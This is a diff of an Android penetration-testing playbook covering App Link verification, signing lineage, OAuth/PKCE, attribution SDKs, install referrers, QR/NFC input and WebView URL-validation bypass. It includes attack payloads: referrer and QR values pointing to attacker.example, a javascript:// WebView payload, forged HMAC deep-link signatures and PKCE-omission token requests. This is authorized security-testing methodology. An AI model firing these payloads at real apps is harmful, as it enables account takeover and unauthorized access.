-  apksigner verify --print-certs --verbose base.apk | grep -iE 'Signer #1 certificate SHA-256 digest|Verified using v'
+  apksigner verify --print-certs --verbose "$E/apk/base.apk" | grep -iE 'Signer #1 certificate SHA-256 digest|Verified using v'   # the APK pulled from the device (`pm path`, D09-016), never a developer build
   # every declared host
-  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u); do
+  for H in $(grep -ohE 'android:host="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u); do
     echo "== $H"
     curl -sSIL --max-time 10 "https://$H/.well-known/assetlinks.json" | grep -iE '^HTTP/|^location:|^content-type:'
     curl -sS   --max-time 10 "https://$H/.well-known/assetlinks.json" \
@@ -772,12 +809,17 @@ Decision:
 - **Proof:** Three values side by side — the `sha256_cert_fingerprints` from the served JSON, the
   `Signer #1 certificate SHA-256 digest` from `apksigner`, and the on-device state from D09-014 — with the
   mismatch highlighted. A 404 or non-200 is equally decisive; record the exact status and any `Location`
-  header.
+  header. A statement listing several fingerprints is normal (key rotations, white-label builds, lineage
+  ancestors — large publishers list six or more and serve several statements per host): it is a PASS when
+  **any** listed fingerprint is the current signer **or** a member of the APK's signing lineage
+  (`apksigner lineage --print-certs --apk base.apk`). The mismatch worth reporting is a statement that lists
+  **none** of them (verification fails) or one that lists a fingerprint outside the lineage (D09-019).
 - **Escalation:** → D09-026/-027 squat; the correct fingerprint also feeds the D03/D06 signature-permission
   analysis and the D18 API-key restriction check — capture it once and reuse it.
 - **Ruled out when:** Every declared host serves a 200 `application/json` statement with no redirect hops,
-  the namespace is `android_app`, the package name matches, and one of the listed fingerprints equals the
-  shipping signer digest. Paste the `curl -sSIL` header block as evidence that there were no redirects.
+  the namespace is `android_app`, the package name matches, one of the listed fingerprints equals the shipping
+  signer digest or a lineage member, and `pm get-app-links` agrees (`verified`). Paste the `curl -sSIL` header
+  block as evidence that there were no redirects.
 
 ### D09-016 · Play App Signing: the fingerprint you checked may be the wrong certificate
 
@@ -895,27 +937,33 @@ Decision:
 | **Requires** | applink |
 | **Maps to** | repository harness `tools/04-applink-verify.sh` ("a stale sha256 fingerprint (old signing key still trusted)"); MASTG-TECH-0174 |
 
+| **Record** | logs/D09-019.txt (lineage dump), logs/D09-019-trusted.txt, logs/D09-019-lineage.txt, the `comm` output |
 - **Test:** Statements accumulate fingerprints; nobody removes them. A fingerprint that corresponds to a
   retired signing key means anything signed with that key still verifies as the owner of the domain. If the
   old key ever left the client's control — an outsourced build, a former agency, a leaked keystore — the
   domain is claimable today.
 - **How:**
   ```bash
-  curl -s https://target.example/.well-known/assetlinks.json | jq -r '.[].target.sha256_cert_fingerprints[]' | sort -u > /tmp/trusted.txt
-  apksigner verify --print-certs store/base.apk | grep -i 'SHA-256' | awk '{print $NF}' | tr 'a-f' 'A-F' > /tmp/current.txt
-  comm -23 /tmp/trusted.txt /tmp/current.txt      # fingerprints trusted but not shipping
-  wc -l /tmp/trusted.txt /tmp/current.txt
+  curl -s "https://$H/.well-known/assetlinks.json" | jq -r '.[].target.sha256_cert_fingerprints[]' | tr 'a-f' 'A-F' | sort -u > "$E/logs/D09-019-trusted.txt"
+  # the FULL v3 signing lineage, not only the current signer — the on-device verifier matches ANY certificate in it
+  apksigner lineage --print-certs --verbose --apk "$E/apk/base.apk" 2>/dev/null | tee "$E/logs/D09-019.txt" | grep -iE 'SHA-256 digest|rollback|permission|auth|installed data'
+  apksigner verify --print-certs --verbose "$E/apk/base.apk" | grep -iE 'SHA-256 digest' | awk '{print $NF}' | tr 'a-f' 'A-F' | sort -u > "$E/logs/D09-019-lineage.txt"
+  comm -23 "$E/logs/D09-019-trusted.txt" "$E/logs/D09-019-lineage.txt"   # trusted AND outside the lineage = the candidate
+  wc -l "$E/logs/D09-019-trusted.txt" "$E/logs/D09-019-lineage.txt"
   # historical builds tell you which key was which
   # (pull older releases from a mirror's version-history page, then:)
   for a in old/*.apk; do echo "$a"; apksigner verify --print-certs "$a" | grep -i 'SHA-256'; done
   ```
-- **Proof:** A trusted fingerprint that matches an **older** APK's signer and not the current one, with both
-  `apksigner` outputs shown. Ask the client directly whether that key is retired and where it lives; the
-  answer belongs in the report.
+- **Proof:** A trusted fingerprint that is **outside** the signing lineage (and that the client cannot account
+  for), with the statement and both `apksigner` outputs shown. A lineage ancestor in the statement is expected
+  — it is what lets older installs keep verifying — and is a PASS, not a finding. Record instead which lineage
+  entries hold the `rollback` capability: those define which older-key builds may still update the install
+  (→ D02). Ask the client directly whether a non-lineage key is retired and where it lives; the answer belongs
+  in the report.
 - **Escalation:** → D02 signing and build integrity; → D09-026 if the old key is reachable.
-- **Ruled out when:** Every trusted fingerprint corresponds to a currently-shipping signer (v1/v2/v3 rotation
-  lineage counts — check `apksigner verify --print-certs --verbose` for the full lineage), or the client
-  confirms in writing that each listed key is current. Record the confirmation.
+- **Ruled out when:** Every trusted fingerprint is the current signer or a member of the APK's signing lineage
+  without `rollback` capability (`apksigner lineage --print-certs`), or the client confirms in writing that each
+  listed non-lineage key is current. Record the lineage dump and the confirmation.
 
 ### D09-020 · A statement host the vendor no longer owns, or a dangling subdomain
 
@@ -933,7 +981,7 @@ Decision:
   both the app's link traffic *and* the `assetlinks.json` that authorises a package to handle it.
 - **How:**
   ```bash
-  for H in $(grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sed 's/^\*\.//' | sort -u); do
+  for H in $(grep -ohE 'android:host="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sed 's/^\*\.//' | sort -u); do
     printf '%-40s ' "$H"
     CN=$(dig +short CNAME "$H" | tr -d '\n'); A=$(dig +short A "$H" | head -1)
     HTTP=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 "https://$H/" || echo ERR)
@@ -973,7 +1021,7 @@ Decision:
   # every autoVerify filter and every scheme inside it
   python3 - <<'PY'
   import re
-  m = open('out/AndroidManifest.merged.xml').read()
+  m = open('"$DEC/apktool/AndroidManifest.xml"').read()
   for f in re.findall(r'<intent-filter[^>]*autoVerify="true".*?</intent-filter>', m, re.S):
       print('SCHEMES:', re.findall(r'android:scheme="([^"]+)"', f),
             'HOSTS:', re.findall(r'android:host="([^"]+)"', f))
@@ -1004,32 +1052,48 @@ Decision:
 | **Requires** | applink |
 | **Maps to** | MASTG-KNOW-0019; MASTG-TECH-0174; MASTG-TEST-0393 |
 
+| **Record** | logs/D09-022.txt (mixed-filter extraction and the cross-filter sweep) |
 - **Test:** A custom scheme can never be auto-verified. Putting one in the same filter as the verified https
   data elements does two things: pre-12 it voids verification for the whole app (D09-021), and at every API
   level it creates an unverifiable alias onto the *same handler* that the verified link protects — combined
-  with the `<data>` cross-product (D09-002), the handler is reachable on `myapp://verified.host/path`.
+  with the `<data>` cross-product (D09-002), the handler is reachable on `myapp://verified.host/path`. The alias
+  also lives in a *different* filter: a host-less custom-scheme filter (a payment scheme, an NDEF filter) on the
+  same activity reaches the same router, and a router that classifies by host before scheme hands that entry the
+  whole https route table — test across filters, not only inside the `autoVerify` one.
 - **How:**
   ```bash
-  xmlstarlet sel -t -m "//intent-filter[@android:autoVerify='true']" -o "filter:" \
+  xmlstarlet sel -N android=http://schemas.android.com/apk/res/android -t -m "//intent-filter[@android:autoVerify='true']" -o "filter:" \
     -m "data" -o " scheme=" -v "@android:scheme" -o " host=" -v "@android:host" -b -n \
-    out/AndroidManifest.merged.xml 2>/dev/null \
-  || python3 - <<'PY'
-  import re
-  m=open('out/AndroidManifest.merged.xml').read()
-  for f in re.findall(r'<intent-filter[^>]*autoVerify="true".*?</intent-filter>', m, re.S):
-      sch=set(re.findall(r'android:scheme="([^"]+)"', f))
-      if sch - {'http','https'}: print('MIXED FILTER schemes=', sch, 'hosts=', re.findall(r'android:host="([^"]+)"', f))
+    "$DEC/apktool/AndroidManifest.xml" 2>/dev/null \
+  || python3 - "$DEC/apktool/AndroidManifest.xml" <<'PY'
+  import sys, xml.etree.ElementTree as ET
+  A = '{http://schemas.android.com/apk/res/android}'
+  for f in ET.parse(sys.argv[1]).getroot().iter('intent-filter'):
+      if f.get(A+'autoVerify') != 'true': continue
+      sch = {d.get(A+'scheme') for d in f.findall('data') if d.get(A+'scheme')}
+      if sch - {'http', 'https'}: print('MIXED FILTER schemes=', sch, 'hosts=', [d.get(A+'host') for d in f.findall('data') if d.get(A+'host')])
   PY
   # then reach the protected handler over the unverifiable alias
-  adb shell am start -W -a android.intent.action.VIEW -d "myapp://app.target.example/reset?token=X" com.target.app
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'myapp://app.target.example/reset?token=X'" "$PKG"
+  # cross-FILTER alias: every non-http(s) scheme the app declares ANYWHERE (host-less, non-BROWSABLE and NDEF filters
+  # included), fired at every verified host + route. A router that branches on host before scheme hands this entry
+  # the whole https route table.
+  for S in $(grep -ohE 'android:scheme="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u | grep -vE '^https?$'); do
+    for H in $(adb -s "$SERIAL" shell -n pm get-app-links "$PKG" | sed -n '/Domain verification state/,$p' | grep -oE '^ +[a-z0-9.*-]+:' | tr -d ' :'); do
+      adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'$S://$H/<route>?<params>'" "$PKG" | grep -E 'Status|Activity'
+    done
+  done | tee "$E/logs/D09-022.txt"
+  # non-BROWSABLE filters: a browser cannot reach them (that is AM-03) — fire them from the probe's `start` step
+  # with --ez browsable false (D09-076)
   ```
 - **Proof:** The mixed filter quoted, plus `am start -W` returning `Status: ok` with the App-Link-protected
   activity resolved on the custom-scheme alias — and `pm get-app-links` showing the hosts unverified on a
   pre-12 device.
 - **Escalation:** The alias is a class (c) entry point in the D09-006 table, so every interception item
   applies to it regardless of how well the https side is verified.
-- **Ruled out when:** No `autoVerify` filter contains a non-http(s) `<data android:scheme>`. Paste the
-  extraction output.
+- **Ruled out when:** No `autoVerify` filter contains a non-http(s) `<data android:scheme>`, **and** no other
+  filter on the same activity (or on an alias of it) declares a non-http(s) scheme, **and** the cross-filter
+  sweep above resolved nothing. Paste the extraction output and the sweep.
 
 ### D09-023 · Re-verification cadence — write the remediation-verification clause correctly
 
@@ -1071,10 +1135,11 @@ Decision:
 | **Severity ceiling** | Critical |
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the hijacked link is a magic link |
 | **Attacker** | AM-03 |
-| **Applies to** | any app using Branch (`*.app.link`), AppsFlyer (`*.onelink.me`), Adjust (`*.go.link`), Firebase Dynamic Links or a similar link-shortening/attribution service |
+| **Applies to** | any app using Branch (`*.app.link`), AppsFlyer (`*.onelink.me`), Adjust (`*.go.link`) or a similar link-shortening/attribution service. A leftover Firebase Dynamic Links host (`<name>.page.link`) is a different case: the service shut down on 2025-08-25 and its statement file is gone, so the host can never verify — treat it as D09-027 (unverified https) and D09-020 (dangling vendor host) material |
 | **Requires** | deeplink |
 | **Maps to** | H1 **#855618** (Shopify Arrive — magic-link ATO over an unverified Branch `app.link` domain, rated **Low** by the vendor despite full ATO) |
 
+| **Record** | logs/D09-024-<host>.json (each served statement) and the per-host status table in logs/D09-024.txt |
 - **Test:** The app registers the *vendor's* domain in its manifest, but the statement file on that domain is
   served by the vendor and frequently does not list the client's package or fingerprint — or is empty, or
   404s. The client's security team never looks because "that's not our domain". This is the single most
@@ -1082,11 +1147,11 @@ Decision:
 - **How:**
   ```bash
   # every non-first-party host the manifest claims
-  grep -ohE 'android:host="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u \
+  grep -ohE 'android:host="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u \
     | grep -iE 'app\.link|onelink\.me|go\.link|page\.link|bnc\.lt|adj\.st|smart\.link|tinyurl|lnk\.to'
   for H in <those hosts>; do
-    echo "== $H"; curl -s -o /tmp/al.json -w 'code=%{http_code} type=%{content_type}\n' "https://$H/.well-known/assetlinks.json"
-    jq -r '.[].target | "\(.package_name) \(.sha256_cert_fingerprints|length)fp"' /tmp/al.json 2>/dev/null || cat /tmp/al.json | head -5
+    echo "== $H"; curl -s -o "$E/logs/D09-024-$H.json" -w 'code=%{http_code} type=%{content_type}\n' "https://$H/.well-known/assetlinks.json"
+    jq -r '.[].target | "\(.package_name) \(.sha256_cert_fingerprints|length)fp"' "$E/logs/D09-024-$H.json" 2>/dev/null || head -5 "$E/logs/D09-024-$H.json"
   done
   adb shell pm get-app-links com.target.app | grep -iE 'app\.link|onelink|go\.link|page\.link'
   ```
@@ -1136,9 +1201,9 @@ Decision:
   ```bash
   curl -s https://target.example/.well-known/assetlinks.json \
     | jq -r '.[] | "\(.relation|join(",")) :: \(.target.namespace) :: \(.target.package_name // .target.site)"'
-  grep -rn 'CredentialManager\|CreatePublicKeyCredentialRequest\|GetPublicKeyCredentialOption\|androidx.credentials' out/sources/ | head
+  grep -rn 'CredentialManager\|CreatePublicKeyCredentialRequest\|GetPublicKeyCredentialOption\|androidx.credentials' "$DEC/jadx/sources/" | head
   # what origin does the app actually request?
-  grep -rn '"rp"\|rpId\|relying' out/sources/ out/assets 2>/dev/null | head
+  grep -rn '"rp"\|rpId\|relying' "$DEC/jadx/sources/" "$DEC/apktool/assets" 2>/dev/null | head
   adb shell pm verify-app-links --re-verify com.target.app && adb shell pm get-app-links com.target.app
   ```
 - **Proof:** A `get_login_creds` (or `handle_all_urls`) entry whose `target.site` or `package_name` is outside
@@ -1263,7 +1328,7 @@ Decision:
 - **How:**
   ```bash
   # 1. observe the real flow
-  grep -rn -iE 'redirect_uri|response_type|client_id|code_challenge|code_verifier|AppAuth|net\.openid\.appauth|CustomTabsIntent' out/sources/ | head -40
+  grep -rn -iE 'redirect_uri|response_type|client_id|code_challenge|code_verifier|AppAuth|net\.openid\.appauth|CustomTabsIntent' "$DEC/jadx/sources/" | head -40
   # in Burp: capture GET /authorize?...&redirect_uri=com.target.app:/oauth2redirect&response_type=code...
   # 2. confirm the scheme is claimable
   adb shell pm query-activities -a android.intent.action.VIEW -d "com.target.app:/oauth2redirect" | grep -E 'packageName|name='
@@ -1300,7 +1365,7 @@ Decision:
 - **How:**
   ```bash
   # 1. does the client even send a challenge?
-  grep -rnE 'code_challenge|code_verifier|S256|CodeVerifierUtil|generateRandomCodeVerifier' out/sources/ | head
+  grep -rnE 'code_challenge|code_verifier|S256|CodeVerifierUtil|generateRandomCodeVerifier' "$DEC/jadx/sources/" | head
   # 2. omit the verifier entirely at exchange
   curl -s -X POST https://auth.target.example/oauth/token \
     -d grant_type=authorization_code -d code="$CODE" -d client_id="$CID" -d redirect_uri="$RURI"
@@ -1329,21 +1394,26 @@ Decision:
 | **Requires** | oauth, deeplink |
 | **Maps to** | Google Mobile VRP auditing tip, verbatim: "Implicit grant is always bad; If using Authz flow, check for PKCE use; If using PKCE, check that it is not predictable"; the corpus's disclosed Superhuman/Grammarly "Authorization Code with PKCE flow implementation vulnerability that allows account takeover" |
 
+| **Record** | logs/D09-030.txt (ten sampled verifiers) and the quoted generator source |
 - **Test:** PKCE protects a code only if the verifier is unguessable. `java.util.Random`, `Math.random()`,
   a time-seeded generator, a fixed string, or a verifier derived from a device identifier all make an
   intercepted code redeemable by the interceptor.
 - **How:**
   ```bash
-  grep -rn -B6 -A10 'code_verifier\|codeVerifier\|generateRandomCodeVerifier\|CodeVerifierUtil' out/sources/ \
+  grep -rn -B6 -A10 'code_verifier\|codeVerifier\|generateRandomCodeVerifier\|CodeVerifierUtil' "$DEC/jadx/sources/" \
     | grep -nE 'new Random\(|Math\.random|System\.currentTimeMillis|nanoTime|UUID\.randomUUID|SecureRandom|ANDROID_ID|Settings\.Secure'
   ```
   `SecureRandom` with a default seed is correct; `new Random(System.currentTimeMillis())` is not. Then
   confirm at runtime by collecting verifiers across repeated logins:
   ```javascript
   Java.perform(function () {
-    var M = Java.use('net.openid.appauth.internal.UriUtil');   // or the app's own helper class
-    // hook the actual generator you found in jadx and print its output
+    var CV = Java.use('net.openid.appauth.CodeVerifierUtil');   // AppAuth's generator; otherwise the generator you found in jadx
+    CV.generateRandomCodeVerifier.overload('java.security.SecureRandom', 'int').implementation = function (r, n) {
+      var v = this.generateRandomCodeVerifier(r, n); console.log('[verifier] ' + v); return v; };
   });
+  ```
+  ```bash
+  frida -D "$SERIAL" -n "$PKG" -l d09-030.js -q -t 900 | tee "$E/logs/D09-030.txt"   # then run ten logins
   ```
   Collect at least ten and check entropy: identical prefixes, monotonic values or a 32-bit space is the
   finding.
@@ -1369,8 +1439,8 @@ Decision:
   a class (b) or class (c) entry point from the D09-006 table. If it does, it is interceptable.
 - **How:**
   ```bash
-  grep -rnE 'getQueryParameter\("(token|authToken|auth_token|jwt|code|session|sid|access_token|id_token|magic|otp|nonce|invite)"\)' out/sources/
-  grep -rnE 'magic|passwordless|one_?tap|verify_?token|login_?link|sign_?in_?link' out/sources/ | head -30
+  grep -rnE 'getQueryParameter\("(token|authToken|auth_token|jwt|code|session|sid|access_token|id_token|magic|otp|nonce|invite)"\)' "$DEC/jadx/sources/"
+  grep -rnE 'magic|passwordless|one_?tap|verify_?token|login_?link|sign_?in_?link' "$DEC/jadx/sources/" | head -30
   # and the emitted side — what does the backend put in the email?
   # trigger the flow yourself and read the link out of the mailbox
   ```
@@ -1438,10 +1508,10 @@ Decision:
   ```bash
   adb shell pm get-app-links com.target.app
   adb shell dumpsys package domain-preferred-apps | grep -A6 com.target.app
-  grep -nB3 -A8 '<data android:scheme=' out/AndroidManifest.merged.xml
+  grep -nB3 -A8 '<data android:scheme=' "$DEC/apktool/AndroidManifest.xml"
   # diff an older release against the current one: which scheme appeared, and when?
   diff <(grep -ohE 'android:scheme="[^"]+"' old/AndroidManifest.xml | sort -u) \
-       <(grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | sort -u)
+       <(grep -ohE 'android:scheme="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | sort -u)
   # and test BOTH delivery paths on BOTH API levels
   adb -s emulator-5554 shell am start -a android.intent.action.VIEW -d 'https://app.target.example/auth?token=X'   # API < 31
   adb -s emulator-5556 shell am start -a android.intent.action.VIEW -d 'https://app.target.example/auth?token=X'   # API >= 31
@@ -1475,7 +1545,7 @@ Decision:
   adb shell pm query-activities -a android.intent.action.VIEW -d "<sdkscheme>://x" | grep -E 'packageName|name='
   adb shell dumpsys package r | grep -n -A5 "Scheme: \"<sdkscheme>\""
   # is it app-scoped?
-  grep -ohE 'android:scheme="[^"]+"' out/AndroidManifest.merged.xml | cut -d'"' -f2 \
+  grep -ohE 'android:scheme="[^"]+"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 \
     | awk '{print length($0), $0}' | sort -n     # short generic names (pay, auth, myapp) are the smell
   ```
   Then install a second app (a public one from the same SDK ecosystem, or your stub) declaring the identical
@@ -1495,7 +1565,7 @@ Decision:
 | **Severity ceiling** | High |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the router sink reached) |
 | **Attacker** | AM-09 (the SDK's backend or whoever controls the link record), AM-02 |
-| **Applies to** | all apps bundling Branch, AppsFlyer, Adjust, Kochava, Firebase Dynamic Links or a similar MMP |
+| **Applies to** | all apps bundling Branch, AppsFlyer, Adjust, Kochava or a similar MMP (Firebase Dynamic Links shut down on 2025-08-25 — its `getDynamicLink` callback is dead code, not a live deferred-link path) |
 | **Requires** | deeplink, firebase, ads-sdk |
 | **Maps to** | no external identifier verified for this exact path in the corpus — the corpus covers exported install-referrer *receivers*, not the deferred-deep-link callback. Report it on mechanism, with the SDK's own documentation as the reference |
 
@@ -1506,8 +1576,9 @@ Decision:
   more permissive* branch than the intent path.
 - **How:**
   ```bash
-  grep -rnE 'io\.branch|com\.appsflyer|com\.adjust\.sdk|Kochava|FirebaseDynamicLinks|getDynamicLink' out/sources/ | head
-  grep -rnE 'onDeepLinking|onInstallConversionDataLoaded|onAppOpenAttribution|initSession|BranchUniversalObject|\+clicked_branch_link|deep_link_value|af_dp|af_deeplink' -A25 out/sources/ \
+  grep -rnE 'io\.branch|com\.appsflyer|com\.adjust\.sdk|Kochava' "$DEC/jadx/sources/" | head
+  grep -rn 'page\.link\|getDynamicLink\|FirebaseDynamicLinks' "$DEC/jadx/sources/" "$DEC/apktool/AndroidManifest.xml"   # dead resolver (service shut down 2025-08-25); any host it still declares goes to D09-027
+  grep -rnE 'onDeepLinking|onInstallConversionDataLoaded|onAppOpenAttribution|initSession|BranchUniversalObject|\+clicked_branch_link|deep_link_value|af_dp|af_deeplink' -A25 "$DEC/jadx/sources/" \
     | grep -nE 'startActivity|parseUri|loadUrl|Uri\.parse|route\(|navigate\('
   ```
   Then substitute your own value at the callback boundary:
@@ -1549,12 +1620,12 @@ Decision:
   it is whether the *server* grants anything on the strength of a referrer the client reports.
 - **How:**
   ```bash
-  grep -rnE 'com\.android\.installreferrer|InstallReferrerClient|getInstallReferrer|ReferrerDetails|INSTALL_REFERRER' out/sources/
+  grep -rnE 'com\.android\.installreferrer|InstallReferrerClient|getInstallReferrer|ReferrerDetails|INSTALL_REFERRER' "$DEC/jadx/sources/"
   # on a fresh install, deliver an arbitrary referrer
   adb shell pm clear com.target.app
   adb shell am broadcast -a com.android.vending.INSTALL_REFERRER \
     -n com.target.app/<the.referrer.Receiver> \
-    --es referrer 'utm_source=x&referrer_code=VICTIMCODE&promo=STAFF100&bucket=premium&deep_link_value=targetapp%3A%2F%2Fwebview%3Furl%3Dhttps%3A%2F%2Fattacker.example%2F'
+    --es referrer "'utm_source=x&referrer_code=VICTIMCODE&promo=STAFF100&bucket=premium&deep_link_value=targetapp%3A%2F%2Fwebview%3Furl%3Dhttps%3A%2F%2Fattacker.example%2F'"
   ```
   Then watch the wire, not the screen.
 - **Proof:** The referrer string reappearing verbatim in an `/attribution` or `/referral/claim` request, and
@@ -1583,8 +1654,8 @@ Decision:
   `getRawValue()` to its sink and see what an attacker-printed code reaches.
 - **How:**
   ```bash
-  grep -rnE 'BarcodeScanning\.getClient|BarcodeScannerOptions|GmsBarcodeScanning|Barcode\.(FORMAT_QR_CODE|TYPE_URL|TYPE_WIFI)|getRawValue\(\)|getDisplayValue\(\)|getUrl\(\)|getWifi\(\)|ZXing|MultiFormatReader|decodeWithState' out/sources/
-  grep -rn 'getRawValue()' -A20 out/sources/ | grep -nE 'Uri\.parse|Intent\.parseUri|startActivity|loadUrl|WifiNetworkSuggestion|addNetwork|connect\(|pay\(|linkDevice'
+  grep -rnE 'BarcodeScanning\.getClient|BarcodeScannerOptions|GmsBarcodeScanning|Barcode\.(FORMAT_QR_CODE|TYPE_URL|TYPE_WIFI)|getRawValue\(\)|getDisplayValue\(\)|getUrl\(\)|getWifi\(\)|ZXing|MultiFormatReader|decodeWithState' "$DEC/jadx/sources/"
+  grep -rn 'getRawValue()' -A20 "$DEC/jadx/sources/" | grep -nE 'Uri\.parse|Intent\.parseUri|startActivity|loadUrl|WifiNetworkSuggestion|addNetwork|connect\(|pay\(|linkDevice'
   ```
   ```bash
   qrencode -o poc1.png 'targetapp://webview?url=https://attacker.example/x'
@@ -1618,7 +1689,7 @@ Decision:
   filters are now reachable from a tag without any NFC declaration at all.
 - **How:**
   ```bash
-  grep -nE 'android.nfc.action.(NDEF_DISCOVERED|TECH_DISCOVERED|TAG_DISCOVERED)' -A10 out/AndroidManifest.merged.xml
+  grep -nE 'android.nfc.action.(NDEF_DISCOVERED|TECH_DISCOVERED|TAG_DISCOVERED)' -A10 "$DEC/apktool/AndroidManifest.xml"
   adb shell getprop ro.build.version.sdk
   ```
   Write a tag (or emulate the dispatch if you have none):
@@ -1655,10 +1726,10 @@ Decision:
   boundary is decorative and any web link can claim notification origin.
 - **How:**
   ```bash
-  grep -rnE 'trust_sig|pn_trust|signature|sig=|hmac|Mac\.getInstance|verifySignature' out/sources/ \
+  grep -rnE 'trust_sig|pn_trust|signature|sig=|hmac|Mac\.getInstance|verifySignature' "$DEC/jadx/sources/" \
     | grep -iE 'deeplink|trampoline|notif|route|uri' | head -30
   # find the key source
-  grep -rn -B5 -A15 'Mac\.getInstance\|SecretKeySpec' out/sources/ | grep -nE '"[A-Za-z0-9+/=]{16,}"|BuildConfig\.|getString\(R\.string'
+  grep -rn -B5 -A15 'Mac\.getInstance\|SecretKeySpec' "$DEC/jadx/sources/" | grep -nE '"[A-Za-z0-9+/=]{16,}"|BuildConfig\.|getString\(R\.string'
   # then self-sign
   python3 - <<'PY'
   import hmac, hashlib, base64
@@ -1666,7 +1737,7 @@ Decision:
   payload = 'targetapp://admin/route?x=1'
   print(base64.urlsafe_b64encode(hmac.new(key, payload.encode(), hashlib.sha256).digest()).decode())
   PY
-  adb shell am start -a android.intent.action.VIEW -d 'targetapp://admin/route?x=1&pn_trust_sig=<yours>' com.target.app
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://admin/route?x=1&pn_trust_sig=<yours>'" "$PKG"
   ```
 - **Proof:** A self-signed deep link accepted on the trusted path — a route normally reachable only from a
   push notification now reachable from a plain web link. Show the same URI **without** the signature being
@@ -1697,13 +1768,13 @@ Decision:
   ```bash
   # shortcuts
   adb shell dumpsys shortcut | sed -n '/com.target.app/,/^  [A-Za-z]/p'
-  adb shell cmd shortcut get-shortcuts 0 com.target.app
-  grep -rnE 'requestPinShortcut|pushDynamicShortcut|setDynamicShortcuts|updateShortcuts|disableShortcuts|setLongLived' out/sources/ out/res/xml/
+  adb -s "$SERIAL" shell -n cmd shortcut get-shortcuts --user 0 "$PKG"     # syntax: get-shortcuts [--user N] [--flags F] PACKAGE; a positional 0 is read as the package
+  grep -rnE 'requestPinShortcut|pushDynamicShortcut|setDynamicShortcuts|updateShortcuts|disableShortcuts|setLongLived' "$DEC/jadx/sources/" "$DEC/apktool/res/xml/"
   # pin on version N, install N+1, re-fire the frozen intent
   adb shell am start -n com.target.app/<targetClass from the dump> --es <old extra> <old value>
   # instant-app remnants
-  grep -rn 'dist:instant\|targetSandboxVersion\|InstantApps\|isInstantApp' out/AndroidManifest.merged.xml out/sources/ | head
-  grep -nE 'android:host=|android:pathPrefix=' out/AndroidManifest.merged.xml | sort -u
+  grep -rn 'dist:instant\|targetSandboxVersion\|InstantApps\|isInstantApp' "$DEC/apktool/AndroidManifest.xml" "$DEC/jadx/sources/" | head
+  grep -nE 'android:host=|android:pathPrefix=' "$DEC/apktool/AndroidManifest.xml" | sort -u
   adb shell am start -a android.intent.action.VIEW -d 'https://target.example/<instant-era-path>'
   ```
 - **Proof:** The old intent (or instant-era path) resolving to a code path the current UI cannot reach — an
@@ -1731,20 +1802,21 @@ Decision:
 - **How:** Start from the stack frame D09-012 gave you.
   ```bash
   # the entry point
-  jadx-gui out/sources &        # open the class the hook named
+  jadx-gui "$DEC/jadx/sources" &        # open the class the hook named
   # the dispatch
-  grep -rn -A40 'getIntent()\.getData()' out/sources/<Trampoline>.java | sed -n '1,120p'
+  grep -rn -A40 'getIntent()\.getData()' "$DEC/jadx/sources/<Trampoline>.java" | sed -n '1,120p'
   # every case of the dispatcher, and what each consumes
-  grep -rnE 'case "|-> *"|equals\("' out/sources/<Router>.java | head -80
+  grep -rnE 'case "|-> *"|equals\("' "$DEC/jadx/sources/<Router>.java" | head -80
   ```
   For each route record: route key · target activity or action · parameters consumed · whether an
-  authentication check runs **before** the parameters are used · the terminal sink. Then confirm each row at
-  runtime:
+  authentication check runs **before** the parameters are used · the terminal sink · the gate (feature flag or
+  remote-config key, and its live state per device — D09-081). Then confirm each row at runtime:
   ```bash
   adb shell am start -W -a android.intent.action.VIEW -d "targetapp://<route>?<params>" com.target.app
   adb shell dumpsys activity activities | grep -m1 topResumedActivity
   ```
-- **Proof:** The route table. Rank it by sink quality, not by route name: a WebView that already carries the
+- **Proof:** The route table, with the `gate` column filled in (flag/config key, per-device state). Rank it by
+  sink quality, not by route name: a WebView that already carries the
   session, a payment or account-linking action, a file API, a component launcher, an API base-URL setter.
   Everything else is background.
 - **Escalation:** WebView rows → D09-059; state-change rows → D09-066; file rows → D09-063/-064;
@@ -1770,7 +1842,7 @@ Decision:
   check is `uri.scheme == "https" && uri.host == trustedHostName`; anything else is a candidate.
 - **How:**
   ```bash
-  grep -rnE '\.startsWith\(|\.endsWith\(|\.contains\(|\.indexOf\(|\.matches\(|Pattern\.compile' out/sources/ -B3 -A3 \
+  grep -rnE '\.startsWith\(|\.endsWith\(|\.contains\(|\.indexOf\(|\.matches\(|Pattern\.compile' "$DEC/jadx/sources/" -B3 -A3 \
     | grep -inE 'host|url|uri|domain|origin|scheme|trusted|allow|white' | head -60
   ```
   The matrix, fired at every `url=`-style sink you found:
@@ -1822,7 +1894,7 @@ Decision:
   looks at the scheme. Every scheme that carries a host component then passes.
 - **How:**
   ```bash
-  grep -rn 'getHost()' out/sources/ -B6 -A6 | grep -nE 'getScheme\(\)|"https"|equalsIgnoreCase\("https' \
+  grep -rn 'getHost()' "$DEC/jadx/sources/" -B6 -A6 | grep -nE 'getScheme\(\)|"https"|equalsIgnoreCase\("https' \
     || echo "NO SCHEME CHECK NEAR getHost() -- candidate"
   ```
   Payloads, all carrying the trusted host so the validator is satisfied:
@@ -1836,7 +1908,7 @@ Decision:
   http://trusted.example/                            # downgrade: host ok, transport is the payload
   ```
   ```bash
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://webview?url=javascript://trusted.example/%0aalert(document.domain)" com.target.app
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://webview?url=javascript://trusted.example/%0aalert(document.domain)'" "$PKG"
